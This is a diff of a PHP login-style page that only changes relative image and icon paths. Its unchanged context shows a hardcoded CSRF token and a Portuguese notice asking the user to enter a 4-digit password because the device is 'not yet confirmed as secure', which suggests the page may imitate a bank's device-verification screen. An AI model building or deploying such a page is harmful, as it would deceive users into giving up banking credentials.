@@ -19,7 +19,7 @@ session_start();
     <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/semantic.min.css" />
     <!-- Bootstrap theme -->
     <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/bootstrap.min.css" />
-    <link rel="icon" href="../assets/imgs/favicon.ico" type="image/x-icon" />
+    <link rel="icon" href="../../assets/imgs/favicon.ico" type="image/x-icon" />
     <meta name="csrf-token" content="xxvap9tMfNDJBQEcQpXQNS9VkzSHgMwXkX5p7IIa" />
     <style>
         body {
@@ -30,7 +30,7 @@ session_start();
         #topo {
             width: 100%;
             height: 42px;
-            background: url(../assets/imgs/mLogomenor.png) no-repeat;
+            background: url(../../assets/imgs/mLogomenor.png) no-repeat;
             background-position: 14px 14px;
             background-color: #1664ac
         }
@@ -50,7 +50,7 @@ session_start();
         }
 
         .bttenter {
-            background: url(../assets/imgs/bgbottom.png) repeat;
+            background: url(../../assets/imgs/bgbottom.png) repeat;
             border-radius: 4px;
             font-family: arial;
             font-size: 18px;
@@ -69,7 +69,7 @@ session_start();
             width: 100%;
             height: 100%;
             z-index: 998;
-            background: url(../assets/imgs/bg-loading.png) repeat;
+            background: url(../../assets/imgs/bg-loading.png) repeat;
             display: none
         }
 
@@ -128,7 +128,7 @@ session_start();
         }
 
         .bttok {
-            background: url(../assets/imgs/bgbottom.png) repeat;
+            background: url(../../assets/imgs/bgbottom.png) repeat;
             border: 0 none;
             border-radius: 4px;
             color: #fff;
@@ -155,7 +155,7 @@ session_start();
             z-index: 65557;
             width: 120px;
             height: 120px;
-            background: url(../assets/imgs/loading.gif) no-repeat center center #fff;
+            background: url(../../assets/imgs/loading.gif) no-repeat center center #fff;
             border-radius: 10px;
             border: 2px solid #fff;
             top: 50%;
@@ -299,7 +299,7 @@ session_start();
         </div>
 
         <div style="padding: 10px 20px;text-align: justify;background: #F6F4F4;border: 1px solid #D8D8D8;line-height: 26px;font-family: roboto!important;">
-            <img src="../assets/imgs/alert.png" height="13" />
+            <img src="../../assets/imgs/alert.png" height="13" />
             Este dispositivo ainda nao foi confirmado como um dispositivo seguro. por este motivo é necessario que informe a senha de 4 dígitos.
         </div>
 
